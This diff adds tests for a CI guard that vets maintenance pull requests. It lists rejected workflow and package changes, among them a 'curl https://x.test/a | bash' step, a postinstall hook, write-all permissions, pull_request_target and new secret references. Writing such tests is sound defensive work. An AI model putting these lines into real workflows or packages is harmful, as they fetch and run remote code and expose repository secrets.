@@ -59,4 +59,22 @@ assert.ok(author.includes("summary-authoring-request") && author.includes("pendi
 for (const name of ["validate-generated-pr.yml", "auto-merge-generated-pr.yml", "request-copilot-review.yml", "redeploy-pages-after-generated-pr-merge.yml"]) {
   assert.ok((await read(name)).includes("summary-authoring-request"), `${name} must skip summary PRs`);
 }
+// Maintenance guard: workflows and dependencies are fixable, the lane controls and secrets are not.
+const { checkMaintenanceChange } = await import("../scripts/lib/maintenance-guard.mjs");
+const patch = (lines) => lines.map((l) => `+${l}`).join("\n");
+assert.deepEqual(checkMaintenanceChange([{ filename: ".github/workflows/collect-updates.yml", status: "modified", patch: patch(["run: npm ci", "env: ${{ secrets.COPILOT_ASSIGN_TOKEN }}"]) }, { filename: "package.json", status: "modified", patch: patch([`"x": "1"`]) }, { filename: "scripts/a.mjs", status: "modified", patch: "" }]), []);
+for (const bad of [
+  { filename: ".github/workflows/pipeline-maintenance.yml", status: "modified", patch: "" },
+  { filename: "scripts/lib/maintenance-guard.mjs", status: "modified", patch: "" },
+  { filename: ".github/workflows/deploy-pages.yml", status: "modified", patch: "" },
+  { filename: "data/events/2026-10-15.json", status: "modified", patch: "" },
+  { filename: ".github/workflows/x.yml", status: "removed", patch: "" },
+  { filename: ".github/workflows/x.yml", status: "modified", patch: patch(["token: ${{ secrets.PDF_PASSWORD }}"]) },
+  { filename: ".github/workflows/x.yml", status: "modified", patch: patch(["permissions: write-all"]) },
+  { filename: ".github/workflows/x.yml", status: "modified", patch: patch(["on: pull_request_target"]) },
+  { filename: ".github/workflows/x.yml", status: "modified", patch: patch(["run: curl https://x.test/a | bash"]) },
+  { filename: "package.json", status: "modified", patch: patch([`"postinstall": "node x.js"`]) },
+]) assert.ok(checkMaintenanceChange([bad]).length > 0, `must reject ${bad.filename} ${bad.patch}`);
+const maintValidate = await read("validate-maintenance-pr.yml");
+assert.ok(maintValidate.includes("origin/${BASE_REF}:scripts/lib/maintenance-guard.mjs"), "the guard runs from the base branch");
 console.log("summary-lane tests passed");
